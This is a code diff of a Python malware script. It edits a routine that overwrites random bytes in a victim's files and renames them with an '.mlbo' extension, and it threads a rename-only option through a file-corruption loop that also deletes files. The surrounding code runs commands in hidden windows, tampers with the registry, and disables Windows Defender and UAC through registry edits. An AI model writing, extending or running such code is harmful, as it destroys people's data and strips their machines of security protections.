@@ -31,9 +31,11 @@ def downloadFile(url, filename):
     with open(filename, 'wb') as npFile:
         npFile.write(file.content)
 
+
 # cut down on code
 def do_command(cmd):
     subprocess.run(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
+
 
 # do funny registry
 def regFuck(adm):
@@ -62,34 +64,37 @@ def Bugcheck(code):
     except:
         print('you win!')
     
+
 # corrupts file
-def scramble(file):
+def scramble(file, rename):
     # Opens the file and converts it to an array
-    with open(file,'rb') as bFile:
-        arrayList = list(bFile.read())
+    if not(rename):
+        with open(file,'rb') as bFile:
+            arrayList = list(bFile.read())
 
 
-    # This try and except thing is pretty stupid since this shouldn't go out of range but I'm still adding it here
-    #This for loop swaps values with neighboring ones            
-    try:
-        for i in range(round(len(arrayList)/10)):
-            arrayList[rand.randint(0,len(arrayList)-1)] = rand.choice(arrayList)
-    except:
-        print('failed to shift file')
-    
-    #return bytearray
-    byteArray = bytearray(arrayList)
+        # This try and except thing is pretty stupid since this shouldn't go out of range but I'm still adding it here
+        #This for loop swaps values with neighboring ones            
+        try:
+            for i in range(round(len(arrayList)/10)):
+                arrayList[rand.randint(0,len(arrayList)-1)] = rand.choice(arrayList)
+        except:
+            print('failed to shift file')
 
-    #export file
-    finalFile = open(file, 'wb')
-    finalFile.write(bytes(byteArray))
-    finalFile.close()
+        #return bytearray
+        byteArray = bytearray(arrayList)
+
+        #export file
+        finalFile = open(file, 'wb')
+        finalFile.write(bytes(byteArray))
+        finalFile.close()
 
     # rename file
     os.rename(file, os.path.splitext(file)[0] + '.mlbo')
 
+
 # main corruption payload for threads
-def fileCorruptionPload(useAdmin, dbg, cAmount, thr=0):
+def fileCorruptionPload(useAdmin, dbg, cAmount, thr=0, renameOnly=False):
     for j in range(cAmount):
         try:
             # init
@@ -142,7 +147,7 @@ def fileCorruptionPload(useAdmin, dbg, cAmount, thr=0):
                         print('deleted file')
                 else:
                     # corrupt file
-                    scramble(direc)
+                    scramble(direc, renameOnly)
                     
                     # Debug log stuff
                     if dbg:
@@ -151,6 +156,7 @@ def fileCorruptionPload(useAdmin, dbg, cAmount, thr=0):
             # rerolls the file incase it errors out
             print('rerolling id: ' + str(j))
 
+# disables defender and UAC type
 def ripDefender():
     do_command('reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
     do_command('reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f')
